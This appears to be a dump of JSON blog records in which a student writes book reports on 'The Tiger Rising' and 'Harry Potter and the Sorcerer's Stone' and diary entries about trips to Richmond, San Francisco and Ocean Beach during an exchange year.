\u201cStop shrugging your shoulders at me. I hat it, I hate\nthe way you shrug all the time.\u201d</p>\n<p>And that made Rob remember Willie May saying that when he shrugged he\nlooked like a skinny bird trying to fly. It struck him as funny now. He\nlaughed out loud at the thought of it. And without asking him what he\nwas laughing about, without dropping his hand, without stopping, Sistine\nlaughed too.</p>\n<p>Then Rob remembered the name of the feeling that was pushing inside\nhim, filling him fall to overflowing. It was happiness. That was what it\nwas called.</p>\n<p>By the time they made it back to the motel parking lot, it was dark\noutside, and they were both laughing so hard that they could barely\nwalk.</p>\n<p>Explanation</p>\n<p>I chose this one as the plot I loved because it showed a sharp\ncontrast to what Rob was at the beginning of the book. It is happy happy\nbecause I think there are no better way to define it, Some words that\nare long and few people know it are always complex. This plot is simple,\njust happiness being discovered.</p>\n<p>It is like a normal daily joke for us, but there weren\u2019t many before.\nAnd after seeing the tiger again, Rob finally discovered something in\nhis heart. It showed how melancholy Rob and Sistine was. When one is so\ndepressed, once he or she laughed, he or she cannot stop laughing\nbecause they lacks it. And that\u2019s the case for Rob and Sistine. When his\nhappiness began to flow, just like the way we laugh when we just\nfinished crying, but much deeper. Though life isn\u2019t good, though many\nthings black in front of him, Ron finally learn to enjoy the moment a\nlittle and had the little bits of happiness back in his heart.</p>\n<p>2 A Heart-breaking Plot</p>\n<p>Rob took hold of the sheet, and as it billowed out between them, a\nmemory rose up before him: his father standing out in the yard, holding\nhis gun up to the sky, taking aim at a bird.</p>\n<p>\u201cYou think I can hit it?\u201d his father said. \u201cYou think I can hit that\nitty-bitty bird?\u201d</p>\n<p>\u201cRobert,\u201d his mother said, \u201cwhat do you want to shoot that bird\nfor?\u201d</p>\n<p>\u201cTo prove I can,\u201d said his father.</p>\n<p>There was a single crack and the bird was suspended in midair, pinned\nfor a moment to the sky with his father\u2019s bullet. Then it fell.</p>\n<p>\u201cOh, Robert,\u201d his mother said.</p>\n<p>It hurt the back of Rob\u2019s throat to think about that now, to think\nabout the gun and his mother and the small thud the bird made when it\nhit the ground.</p>\n<p>Explanation:</p>\n<p>Reading the sentences above made me sad. It is really a cruel act of\nRob\u2019s father, by shooting the bird, a thing so harmless and attractive.\nI always wondered why Rob\u2019s father shooted it. And the answer is clear:\nit isn\u2019t because he was really bad or something like that, it is because\nthat Rob\u2019s father wanted to prove he isn\u2019t an idiot, a man who can\u2019t do\nanything. The author described it really well and</p>\n<p>heart-breaking: \u201cstill-warm,\u201d \u201cpined,\u201d and \u201cIt is like seeing a life\nactually despairing.\u201d It shows us that Rob\u2019s father wasn\u2019t really happy,\nthe memories are better than what\u2019s in reality, and also that how people\nwere years ago and gave us an impression that Willie Mary\u2019s bird got\ninto bad accidents.</p>\n<h3 id=\"part-three-my-idea-2\">Part Three My Idea</h3>\n<p>After three weeks of writing just some normal parts, I came to the\nclimax of the story at last. Though somebody may think the first twelve\nchapters are long, and it\u2019s boring to read them, I don\u2019t. I think if\nit\u2019s not the first twelve chapters, one can never understand the\nbackground of Rob easily and may think the story is confused and hard to\nunderstand.</p>\n<p>And finally, they found the tigers. It used \u201cenormous and bright\u201d,\nand \u201cpacing back and fourth\u201d to describe it. Reading this part, I saw a\ntiger pacing right in front of me. I was not reading, not in my house,\nnot sitting here for hours, but following Rob and Sistine down the woods\nto see the tiger in Florida, expecting all sorts of exciting things to\nhappen.</p>\n<p>The first reaction Rob made was staring and fearing just like seeing\nsome ancient writings or priceless treasures. It surely is, considering\nthe time of the story. In that time bullying is common and seeing tigers\nout there or other things are rare.</p>\n<p>But Sistine wanted to free it, to let it go, jumping up and down and\nto let it out. She cannot let something move their own way, she didn\u2019t\nadjust to the normal life there.</p>\n<p>After a really long time thinking about the reactions, I think the\ntiger represent Rob\u2019s happiness in his heart. It wanted to come out, but\ncouldn\u2019t as sadness and depression filled in Rob\u2019s head.</p>\n<p>And then Rob seemed to know it better to keep it outside than letting\nit inside, and he let the things in the suitcase out a little. That\u2019s\nthe time when he started laughing. We don\u2019t laugh that hard hearing a\njoke. It showed how Rob was, so helpless a child. Remembering and the\nnonstopping laugh showed Rob was in depression for very long before,\nthat he hated it but still let it rule over happiness, just to keep\nthings inside. But in fact, he suffered more.</p>\n<p>Chapter 15 started by telling us how Rob\u2019s father and Sistine known\neach other. Then it had a sharp move by telling us memories of Rob, his\nmother, how they used to live happily together. I don\u2019t blame him,\nthough, for closing the suitcase. It is so overwhelming.</p>\n<p>As I said before, Rob only let the suitcase open a little, but found\nit dark and painful. But this darkness can not be hidden forever, not in\nfront of Sistine and hiding so long. The next fifteen chapters told us\nhow he got rid of them.</p>\n<p>Although the tiger part in the book is the most exciting part, other\nparts can\u2019t be ignored.</p>\n<p>Chapter 13 is mainly about telling their secrets. We can see\nsimilarities in Rob and Sistine\u2019s family, on their mother, One dead, one\ndivorced, they shared the same dark secrets. Rob couldn\u2019t bear Sistine\nleaving because in the dream she left, leaving unhappiness and\ndepression on the lonely Rob. That\u2019s why he told Sistine the secret of\nhis family.</p>\n<p>I think I discovered a same part about Sistine and Caroline. They\nwere both bright and symbolize happiness and not keeping things\ninside.</p>\n<p>Chapter sixteen is about a talk, simple actually, but touching and\nunforgettable. It shown how Sistine was when her parents were in love.\nThey face the same fate except that Rob\u2019s deeper. On Page 61, we can see\nthe other side of this active girl when she growled and shouted. The\nfamily issue is really bad and, even in some points, worser than\nRob\u2019s.</p>\n<p>I think this is the time when Rob finally discovered somebody he had\nshared the same background with. What I paid attention to was also the\nlast paragraph\u2014-this is the exact point where, the suitcase was secondly\nopened. Inside it, were sweet memories, tigers, and other beautiful\nthings, but Rob didn\u2019t want to face it because her mother died, and he\nthought all things disappeared. He discovered a similarity and opened a\nlittle in the end of chapter 16.</p>\n<p>Chapter 17 is little different. It gave me the impression that Willie\nMay was kind-hearted and Rob\u2019s father was cruel. It, as I said before,\nwas the common society that time.</p>\n<p>Another small point, Rob thought Willie May\u2019s hand could hold the\nentire world. It is really exagerrated but is vivid. It is a hand that\nhold Cricket, that was kind, and experienced many years of hardness.</p>\n<p>Chapter 18 is about Beauchamp wanting Rob to do a job. The rudeness\nin Beanchamp\u2019s voice showed how rich people were that time. they were\nmore than bullies, they get all money while poor people got almost\nnothing. Also that Rob said he believed it in the last sencence. What\ndid he believe? I think he believed that there\u2019s the tiger. He believed\nhe can free it and Beauchamp is the real fool.</p>\n<p>This three chapters really did tell us a real lot things. I don\u2019t\nknow why I have so much to express. Maybe because that the plot is more\nprofound. This book really touched my heart and I liked it best in\nemotional books I\u2019ve read. Let\u2019s see how Rob and Sistine freed the tiger\nnext time.</p>\n<p>\u200b</p>\n", "_id": "66689632547d3fe098118737"}

It\u2019s effects are\nall over the book and especially the next two chapters. The first two\npages tell us about the Durslys and readers know that they must hate\nHarry before they read the next chapter.</p>\n<p>The second chapter describes elements of traditional British stories\nwithout telling about the under pinnings of the plot. Dudly is a bully,\ngreedy boy who wants everything and was spoiled by his parents.</p>\n<p>The third chapter is about letters that was sent by Mcgonagall. It\ndescribes how uncle Vernon threw Harry out to stop him looking at\nletters.

It is why they will treat Harry harshly.</p>\n<p>It also showed the stark contrast between muggles and wizards.</p>\n<p>The words are charming and it makes this book extraordinary.

And if it\u2019s not the courage of Uncle Vernon\nthat enabled him to stand up to Hagrid, the chapter might not be\nexciting.</p>\n<p>The fifth chapter is also vivid. These two chapters describes us\nanother world, when there\u2019s wizards and withches and muggles. Though it\nisn\u2019t as exciting, it\u2019s explanation about magic are unignorable. And\npeople shaking hands with Harry and Hagrids shuddering about \u201cVoldemort\u201d\ngives readers a more accurate understanding about Voldemort.</p>\n<p>The sixth chapter is about Harry meeting the Weasleys, people\ndifferent from the Dursleys, on the Hogwarts Express. It described how\ndull the muggle world, in other words, our world is by contrasting the\ntwo worlds and people in it.</p>\n<p>However, going to Hogwarts isn\u2019t just fun, and hogwarts isn\u2019t a\nparadise. We can still find many bad people like Malfoy, Snape, and\nVoldemort in later chapters in the wizarding world. Going to Hogwarts\nwasn\u2019t an ending for Harry, but a beginning.</p>\n<p>One day I hope I can go to Hogwarts. But I doubt it will happen\nbecause I can\u2019t do anything by pointing my wand at something and\nshouting curses.

And as a gryffindor student,\nHarry became enemies with Draco Malfoy when he stole Neville\u2019s ball,\nwhich Harry managed to get back and was selected a Qudditch seeker.\nMalfoy and Harry decided to have a wizard duel. Harry and his friends\nwas nearly caught when he set out to duel with Malfoy, which that Harry\nrealized is a trick. They then faced a three-headed dog Nicholas Flamel\nbut got back to their dorm safely.</p>\n<h3 id=\"part-two-a-scary-plot\">Part Two A Scary Plot</h3>\n<p>They were looking straight into the eyes of a monstrous dog, a dog\nthat filled the whole space between ceiling and floor.

He was\nnervous because he wasn\u2019t like his classmates. He couldn\u2019t do any magic\nand thought himself is just a boy of 11. It showed us how badly the\nDursleys\u2019 are.</p>\n<p>There are different houses in Hogwarts and Gryffindor and Slytherin\nhas the most conflicts. Slytherin\u2019s, as we I found out, has a\ndiscrimination on muggle-borns. However, it is revealed that\nmuggle-borns, like Hermione Granger, may do better than most of the\npure-bloods.</p>\n<p>The ninth chapter is the most interesting one that I will describe it\nthe longest. I always wondered that because Professor Mcgonagall is so\nstrict, why didn\u2019t she punish or expell Harry? Because that Harry dared\nto stand up to Malfoy and his actions were noble. We feel that Harry\nmost certainly not bad, or even don\u2019t see a single bad feature in him.\nBut why did he break rules twice in the first two weeles to get himself\nexpelled from a such interesting and fascinating place? It is because\nthat he has the curiousity as a child of new, extraordinary things and\nplaces. What makes the story excellent is that characteristics various.\nA boy cannot be unnaughty, or he wouldn\u2019t be anything in the future.</p>\n<p>The dog part plays an important role because that it shows us\nHogwarts isn\u2019t just good, it also contains some dangerous things.</p>\n<p>Overall, these chapters are really fun and good to read. It not only\ndescribes the exciting fights and near death moments, but also gives us\na clear view of people\u2019s personality and the variety of the world.</p>\n<figure>\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/6228b028-b48f-4c60-be16-564231405cc6_image-7.png\"\nalt=\"alt text\" />\n<figcaption aria-hidden=\"true\">alt text</figcaption>\n</figure>\n<h2 id=\"chapter-10-13\">Chapter 10-13</h2>\n<h3 id=\"part-one-a-brief-summary-3\">Part One A Brief Summary</h3>\n<p>Though Ron complained about Hermione being a nerd, Harry, Ron, and\nHermione discovered a friendship by helping each other fighting off a\ntroll.</p>\n<p>Harry was stuck in midair when playing qudditch and Hermione set\nSnape on fire, who was murmuring curses nonstop at Harry.

Ron complained about\nHermione because that she was proud, and the reason of that, as I found\nout later, is because Hermione is a muggle-born. She is weak in the\nheart so she likes showing off and obey rules.</p>\n<p>We can reveal from the book that even Hogwarts teachers, advanced in\nmagic, were scared even to a monster, let alone the Death Eaters and the\nVoldemort himself. That shows the courage of Harry and Ron. about saving\na friend. And in return, Hermione told Mcgonagal the lie. It tells us\nthat people are more likely to become friends when they are good to each\nother or both facing bad things at the same time. Hremione finally gave\nup perfectionism and valued frienship more.</p>\n<p>Again, this chapter show how little Harry know about the magic world\nand how timid he was when spending years with the Dursleys. It is a\nstark contrast between the behavior of him and Malfoy, a student who is\nproud and like Dudley. Malfoy is also damaged by his family.</p>\n<p>The next chapter shows Hogwarts is not a good place where everyone\nstudy hard and have fun. The Qudditch became a game more of fighting\nthan enjoying. There are two sides in Hogwarts, one is Dumbledore and\nHarry, the other is Malfoy and Snape. It showed a place can never be\nwithout fights and complex people.</p>\n<p>Then again, it told us how important friendship is. Hermione saved\nHarry from falling by setting fire on Snape. This makes the story\u2019s\nclimax start. The slip of Nicolas Flamel Makes the story even more\nexciting.</p>\n<p>However, when Harry received and invisibility cloak and almost went\nmad with the Mirror of the Erised, Dumbledore\u2019s appearance changed the\ndirection of the plot. He convinced Harry not to look at it. That\u2019s why\nothers like Qurriel, went following Voldemost. The discussion also\nplayed a big part. It shows Dumbledore is not only one of the best\nsorcerer in the world but also kind.</p>\n<h2 id=\"chapter-13-15\">Chapter 13-15</h2>\n<h3 id=\"part-one-a-brief-summary-4\">Part One A Brief Summary</h3>\n<p>Following Dumblesore\u2019s advice, Harry didn\u2019t visit the mirror anymore.\nGryffindor wins Qudditch, meaning it\u2019ll be first in the\nchampionship.</p>\n<p>However, Harry\u2019s day was ruined when Filch caught him wandering in\ncorridors and Harry was sent to a detention. Filch decreased 50 points\nof Gryffindor as well.</p>\n<p>Harry noticed something\u2014-Fluffy guarding a stone, Snape and Qurriel\u2019s\nargument, and somebody drinking unicorn bloods in the woods.</p>\n<h3 id=\"part-two-a-not-so-happy-plot\">Part Two A Not-So-Happy Plot</h3>\n<p>They slipped back down the spiral staircase, their hearts as light as\ntheir hands, now that Norbert was off them.

It described the\nquarrel of Snape and Qurriel. It revealed that something was about to\nhappen.</p>\n<p>We can see Hagrid in many chapters in the story. Hagrid is an\ninteresting person. He is a fishy but kind. He believes animals are good\ncreatures. Even if they do bad things to him. He even tried to raise a\ndragon, which results in getting Harry in trouble instead. Harry and\nHagrid meets in some points, their kindness and generosity. But they are\nalso different. Harry dare to stand up to bad guys but Hagrid just\nbeared it. In his fifty years mixture both good and bad things, he\nlearned things but just let them pass without revenging.</p>\n<p>Even if Gryffindor isn\u2019t just good, you can\u2019t explain why Harry just\nkeep breaking rules. It\u2019s the boy\u2019s curiousity, but also his lack\nawareness of rules. Though, Harry did learn something from the\ndetertion. and the one hundered fifty points in the next Chapter.</p>\n<p>In chapter eighteen, Harry and his friends got into detentions. It\nshowed that Hogwarts isn\u2019t just a safe place. It is full of dangers,\nNicolas Flamel and a figure drinking unicorn bloods.</p>\n<p>After all, it\u2019s Voldemort\u2019s cruelty makes people fear him. It is\nshown of him, as a dark figure, drinking a beautiful unicorn\u2019s blood. It\nis also shown in later books. Everyone is afraid to end up like the\nvictims do. That\u2019s why even after eleven years, people are still afraid\nof Voldemort and just couldn\u2019t bear to say his name.</p>\n<p>It mainly supported the 2 chapters after them. These three chapters\nand the two chapters before gave clues to readers to let them think\nabout what\u2019s going to happen next. When I reached this point, I almost\nforget time and just kept reading. It\u2019s just because that its plot\nseemed so perfect and ordered really well. It is not only about magic\nand cursing and qurrels, it\u2019s also about friendship and cruelty and\nkindness.</p>\n<h2 id=\"chapter-16-18\">Chapter 16-18</h2>\n<h3 id=\"part-one-a-brief-summary-5\">Part One A Brief Summary</h3>\n<p>Harry and his friends decided to get the stone and finally managed to\nget through, though Ron and Hermione didn\u2019t get inside.</p>\n<p>Then Harry managed to stop Qurriel from getting the stone. Then\nDumbledore came and destroyed the stone, one of Voldemoret\u2019s\nhorcrux.</p>\n<p>After adding 170 points, Gryffindor won the House Cup.</p>\n<h3 id=\"part-two-a-surprising-but-reasonable-plot\">Part Two\nA-Surprising-But-Reasonable Plot</h3>\n<p>For a moment he could see nothing but dark fire, then he was on the\nother side, in the last chamber.</p>\n<p>There was already someone there\u2014but it wasn\u2019t Snape. It wasn\u2019t even\nVoldmort.</p>\n<p>It was Qurriel.</p>\n<figure>\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/56a8ea39-01a2-4109-9120-f11819cbcc09_image-14.png\"\nalt=\"alt text\" />\n<figcaption aria-hidden=\"true\">alt text</figcaption>\n</figure>\n<h3 id=\"part-three-my-idea-5\">Part Three My Idea</h3>\n<p>It is finally the end of book. When I was reading through, I didn\u2019t\neven pause to finish it. It is just too exciting, attracting and\nwell-organized.</p>\n<p>Both chapter sixteen and sevented showed us how Harry managed to get\nthe Philosopher stone. It showed Harry\u2019s brave personality and also his\nselflessness. It vividly described his braveness. As we all know, Harry\nPotter is a first-year Hogwarts student. He isn\u2019t skilled in magic and\nwas almost nothing comparing to the experienced Hogwarts teacher.\nHowever, Harry stood up to Qurriel. We can identify that Harry is really\na brave boy.</p>\n<p>But why can\u2019t Qurriel just shout a killing curse and kill Harry in\none second like Voldemort did to others. Because Qurriel just can\u2019t\ntouch Harry without suffering terrible pain. And why is that? It is\nbecause Qurriel\u2019s a villian, a person who is nasty and mean. All he\ncared is fame, wealth, and power while Harry is a noble, integrity man.\nIt used magic to show the contrast of their characteristics.</p>\n<p>I must also mention Ron and Hermione. Ron is a kid who is not willing\nto study. Because he was born in a pure-blood family that he is close to\nmagic before, which is why he wasn\u2019t as curious as Harry and Hermione.\nHowever, he discovered his special ability in chess, which result in\nhelping Harry doing it.</p>\n<p>Hermione looks like a nerd from the outside, but is really not like\nthat in reality. She is a muggle-born, who were laughed at. That\u2019s why\nshe acted like she know everything to make people impressed. Though\nafter long. her real personality became clear. Also adventurous, Miss\nGranger is loyal to friends, which is why she cannot be absent on the\nadventure to overthrow Qurriel.</p>\n<p>Compared with Malfoy, Crabble, and Goyle, they three seemed more\nintelligent and braver, in other words better and selfless. The reason\nis that Harry and his companys always cooperate and never suspects each\nother in friendship. Malfoy and his gangs are just over-confident and\nproud, which result in nothing in reality.</p>\n<p>We must also know that the real bad guy isn\u2019t always the man who acts\nmean, but a person like everyone else who won\u2019t make sounds to let the\nothers notice him, giving himself more time to think and do dark\nthings.</p>\n<p>At last, Dumbledore came again. All the book, Dumbledore played an\nimportant part in making things for Harry. He gave Harry the\ninvisibility cloak and made the Mirror of Erised. It is just that\nDumbledore gave the chance to Harry to be a hero. I\u2019m sure that\nDumbledore gave many other students the chance. And at a certain point\nit is left for the person himself to go forward.</p>\n<p>The book is mainly about people\u2019s desire, about powers and controls.\nIt is so vividly described that we can almost imagine it\u2019s really\nhappening in London. This book is the best book I\u2019ve read and contained\nas much information as a-300-pages book can.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/f9a75221-d189-4af4-8d6b-b36dc2d2aac8_image-15.png\"\nalt=\"alt text\" /> <img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/7df9ae7e-fe4d-400c-a5a2-92b58f99cc32_image-16.png\"\nalt=\"alt text\" /> <img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/e1295710-6382-470f-9ccd-a3054da97c80_image-17.png\"\nalt=\"alt text\" /></p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>Harry Potter and the Sorcerer\u2019s Stone is a great book and, in short,\nis the best book I\u2019ve ever read.</p>\n<p>The book symbolizes the danger of desire, the necesity of curiousity,\nand complex lifes in the same place. I was wondering about frienship:\nhow Harry, Ron, and Hemione combine together but Malfoy, Crabbe, and\nGoyble didn\u2019t have any achievement. The reason is clear, we must trust\neach other and be eager to sacrifice our own. That\u2019s what makes up\nfriendship.</p>\n<p>There is another point, which is the complex personality of students\nand teachers who live in the same place. Dumbledore, Mcgonagall, and\nHarry stand for power and fairness while the other side Snape and Malfoy\nstand for unfairness and pride. We must know where we belong to,and\nchoose between the two sides.</p>\n<p>The dangers of desire also played quite a part. It shows we must not\nbe confused by money or power to rule the world. That is, in other\nwords, cowardice. And the real bad guy isn\u2019t who acts badly but a person\nwho hides and will be least suspected, concluded to Snape and Qurriel\u2019s\nact.</p>\n<p>Now let\u2019s dig something out from these characters in the book. The\nmain character and also the main protagonist is undoubtedly Harry Poter.\nHe is brave kind-hearted, and curious. If it isn\u2019t his bravery, he would\ndie by fighting Qurriel and may ne would not even the stone in the first\nplace. If it isn\u2019t for his kind-heart, for his thought to protect\nHogwarts from being invaded, he wouldn\u2019t risk his life for Hogwarts, the\nplace where he discovered friendship and warm for the first time in his\nlife. If it wasn\u2019t for his curiousity, he wouldn\u2019t wander around, trying\nto discover something in Hogwarts. He might even not try to think about\nNicholas Hamel. Without even one of these factors, he might be a normal\nstudent and his fame would die down slowly.</p>\n<p>However, I might not mention intelligence because it was foolish to\ntry to be caught searching for things that a first year doesn\u2019t care\nabout, just for confusion that he must be intelligent.</p>\n<p>The most annoying character is Draco Malfoy. Born in a pure-blood\nfamily. He is nothing but a greedy boy. Quite like Dudley. He is a child\nwho hang round with two stupid guys, in order to try to bully someone.\nEverytime be appeared, something not-so-good will happen, which made me\nwant to punch him in the face. He symbolited unfairness and snobbery. He\nis a nasty boy with no real things inside.</p>\n<p>If I am the author, I will rather wrote \u201cI killed Voldemort and\ndestroyed the stone, now there is no longer a threat to the wizarding\nworld\u201d in Dumbledore\u2019s words in P298 instead of \u201cHe is still out there\nsomewhere\u201d It kept a feeling not-so-good in my heart.</p>\n<p>However, in the long seven book struggle, and in order to show\nDumbledore\u2019s greatness, the book ended with Dumbledore rewarding Harry.\nAnd it also told us that Voldmort is hard to defeat, that we have to try\neverything, even sacirfice our own lives sometimes to succeed and\nachieve a goal.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/6c7848f7-45a3-40b4-adae-d605db72fd6f_image-18.png\"\nalt=\"alt text\" /> <img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/10331889-b7ad-4ca0-9a61-7ff01605ecd4_image-19.png\"\nalt=\"alt text\" /></p>\n", "_id": "66689632547d3fe098118738"}
{"title": "Visiting Richmond and North San Francisco", "date": "Thu Aug 31 2023 16:39:14", "type": "california", "body": "<h2 id=\"visting-richmond\">8.27 Visting Richmond</h2>\n<p>So this Friday I went to visit Richmond. I went to North Berkeley\nBart Station, which is not far and downhill from my house, then took the\nBart to Richmond Station. There is Amtrack Train in Richmond station.\nWhen I got out of the station, the roads looked very rundown. There are\nhomeless people everywhere and the roads are very dirty. There is\nnothing good about the place, and I dreaded that place instantly.</p>\n<p>So I looked at map and went south to Marina Park, which is north of\nthe bay. It was a long walk, there were no people on the streets, and\nthe street was very dirty. But after walking pass a highway everything\nbegan to feel cleaner. Then I walked into athe Marina Park.</p>\n<p>There are many geese in the park, and many boats in the harbor. There\nare hundreds of geese, and their poops are everywhere on the road. I\nwonder how it feels to live in the toilet?</p>\n<p>Walking past the large group of geese I could see the bay area, and\nthe view is quite good, and the bayy trail was clean and not dirty like\nthe roads outside.</p>\n<p>I could see Albany from the trails, and the small hills with a few\nhouses. I could also see the golden gate bridge. The view was pretty\ngood in the sun.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/5baf4990-3b06-4fd4-a97c-f911e3a40897\"\nstyle=\"max-width: 400px\" /> <img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/5934271c-0228-4f6b-816c-e41bcb19f5db\"\nstyle=\"max-width: 400px\" /></p>\n<p>Then I continued walking for a while and went on a lyft home. I felt\nkind of dizzy later that day for no reason.</p>\n<p>This is a short post so I think that's it. In conclusion, Richmond is\na drity and ugly place, but the bay trails are definitely worth\nvisiting. I then realized that there are no parks around here, which is\nkind of sad, so the best place for hiking may be bay trails, which I\nwent multiple times this year.</p>\n<h2 id=\"visting-san-francisco\">8.31 Visting San Francisco</h2>\n<h3 id=\"why\">Why?</h3>\n<p>So today I was kind of restless and found myself not doing anything\nat all, so I went to visit North San Francisco. I went on the Bart and\nthen got off at Embarcadero.</p>\n<h3 id=\"shoreline\">Shoreline</h3>\n<p>So I walked to the shoreline. There are many tall buildings in San\nFrancisco, much more crowded than Berkeley. The buildings reminded me of\nthe skyscrapers besides Huangpu River, but of course Huangpu River is\nlike much smaller than the Bay,</p>\n<p>The roads are like really wide, and many people are selling different\nfood, smelling good in the air. Mostly I saw sausages and fruits, but I\nsuppose they are kind of lack hygiene. I could see across the Bay to\nTreasure Island, and Golden Gate Bridge.</p>\n<p>The streets are dirty, and there are many homeless people lying all\naround. There are many cruises and many large boats parked along the\nshoreline which I suppose is for a tour for the people.</p>\n<p>It kind of reminded me of Anchorage, but Anchorage is much cleaner\nand much less crowded and less windy. I already wanted to visit Alaska\nagain, but it takes a lot of money.</p>\n<p>Then I walked along for a while, and on my left was a small hill. I\nkept walking and there was a entertainment park, filled with many small\nrestaurants alongside.</p>\n<p>Then the wind grew strong and almost unbearable, and I didn't want to\nwalk anymore, so I tried going to Powell Street, since there is a Bart\nstation there, and also I wanted to go to Adidas to buy pants.</p>\n<h3 id=\"chinatown\">Chinatown</h3>\n<p>Walking from the shoreline the streets became very dirty and very\nsmall. There are tall buildings alongside and it was very hilly. I\nwalked around and kind of lost direction in Columbus Avenue, going one\nway then going the other way. I walked into Chinatown, and it was very\ndirty. There are a group of like 30 elders in sitting around and playing\nlike poker of something, which reminds of those senior people back in\nChina, and they look kind of alike. I wonder how they felt living here,\nin this crowded city. Some people told me seniors wanted to go back to\ntheir hometown, like \"falling leaves returning to the root\", and I\nthought that they might me lonely and nostalgic or something, but\nanyways, I didn't bother to think more.</p>\n<p>Then I thought I probably would want to live in a less crowded place\nand quieter place when I got like 70 years old, but that's not my\nbusiness now anyways.</p>\n<p>There are a bunch of Chinese restaurants in Chinatown, but most are\nclosed. Then there are some other services. But there are also many\nhomeless people looking like Asian.</p>\n<h3 id=\"market-street\">Market Street</h3>\n<p>Then I walked to market street. It was only my third time to San\nFrancisco (last time I was watching Mean Girls musical, and the time\nbefore my parents' car broke down in Ocean Beach), and it felt quite\nqueer since I have already been here like forever. Anyways I went to\nlook for clothing store.</p>\n<p>Market street is full of smells of smoke and drugs, I think. Anyways,\nthere are bunch of homeless people there, but the shopping mall was\ngood.</p>\n<p>Then I went on the Bart at Powell Street and went home.</p>\n<h3 id=\"conclusion\">Conclusion</h3>\n<p>San Francisco is crowded and a little dirty compared to Berkeley. It\nis also very hilly. Shanghai is much better since it is cleaner and\nthere wasn't homeless people. But visiting seems interesting. San\nFrancisco wouldn't be my top choice for living, though.</p>\n", "_id": "66689632547d3fe098118739"}
{"title": "Visiting Ocean Beach", "date": "Fri Oct 27 2023 01:15:54", "type": "california", "body": "<p>Today I visited Ocean Beach.</p>\n<p>I was in a very bad mood and distorted these days. I couldn't get any\nwork done and think about living in remote settings like in Northern\nEurope or Alaska or New Zealand daily.</p>\n<h2 id=\"eating-dinner\">Eating Dinner</h2>\n<p>I hopped on a Bart and went to Mission district. It is very crowded\nthere with homeless people everywhere. I looked around and bought a\nburrito for my dinner.</p>\n<h2 id=\"taking-bus\">Taking Bus</h2>\n<p>Then I walked around, and it was a steep hill up the road. I took the\nbus.</p>\n<p>I could see the sun setting and it was very beautiful, but when I\ntook out my phone to take a picture the bus moved, and the buildings\nblocked the sun. I never saw the sun again. Then I thought like how days\npass, and they never go back, and suddenly this year is ending, and so\nis my exchange program in UC Berkeley. I felt very very empty inside,\nand felt my incapability to handle things these days.</p>\n<h2 id=\"arriving-at-ocean-beach\">Arriving at Ocean Beach</h2>\n<p>The bus took forever and went down and up a lot of hills. I sit in\nthe most remote corner and played with my phone, watching lots of people\ngetting up and down the bus.</p>\n<p>Then I arrived in Ocean Beach, and it was already dawn. I could\nmildly see the some golden clouds in the end of the horizon.</p>\n<p>Last time I went here was in January, and I went here with my\nparents. But unfortunately the car broke down, and it was very very sad.\nIt was also raining hard that day, and we ended up going nowhere. Then I\nthought maybe I missed my parents now.</p>\n<p>Then I thought how fast time had passed since January, and I felt\nvoided and eaten up by this.</p>\n<h2 id=\"going-along-the-beach-trails\">Going Along the Beach Trails</h2>\n<p>So I went out and walked down the beach, and started walking down the\nbeach trails. There were few people scattered along the beach trails.\nThere were also some dogs, running freely around. I started running,\nuntil I was out of breath, then I started running again. The beach is\nsuch a good place for running, as fresh air filled my lungs all the time\nin the vast open.</p>\n<p>Then I kept walking, and the sky became dimmer. There was hardly any\nlights in the distance. I felt isolated from the world and it was very\ngood feeling. The city seemed remote, and after a while I saw no people.\nI seemed to be walking all alone surrounded by the sea. I haven't seen\nthe ocean much since coming here, instead, I think this is only the\nsecond time since January that I seen the ocean. I could only see the\nBay in Berkeley.</p>\n<p>I felt very melancholy.</p>\n<h2 id=\"turning-back\">Turning Back</h2>\n<p>I went about 1 mile when it really became dark, and I couldn't even\nsee the beach clearly, so I turned back. I was even a little afraid.\nNight here is so different from daytime. There was no roads leading out\nof the beach so I had to climb the slippery sand.</p>\n<p>I quickly found a place to climb out and walked to Upper Great\nHighway.</p>\n<h2 id=\"going-around-at-night\">Going around at night</h2>\n<p>Going around at night is always not interesting here. I went to\nLafayette some days ago at around 7 pm and there wasn't anything to see\nat night. It is the same with West San Francisco. I hadn't thought San\nFrancisco would be this big and thought it would be well lit like\nShanghai at night. I was wrong.</p>\n<h2 id=\"going-back-home\">Going back home</h2>\n<p>I seemed to be going nowhere, and I felt very thirsty, so I tried to\nbu some water. I walked past Sunset Boulevard. Then I bought some water\nand juice, and took the Lyft back home.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>San Francisco beach is very beautiful, but it isn't very accessible\nfrom Berkeley, as it took me 2 hours to go there. If the beach is behind\nthe school (like UCSD), that would be much better. I felt very much\nempty inside these days, and felt no interest other than tinkering\naround with Gnome.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/e4b5953d-6109-48ed-be08-dfb830381762\" /></p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/4a500189-be43-403e-bd2f-ada9058b3b03\" /></p>\n", "_id": "66689632547d3fe09811873a"}

I was completely\nout of sleeping control.</p>\n<p>I mean, I almost adjusted things to the right place this weekend,\nafter sleeping and getting up normally at Saturday.

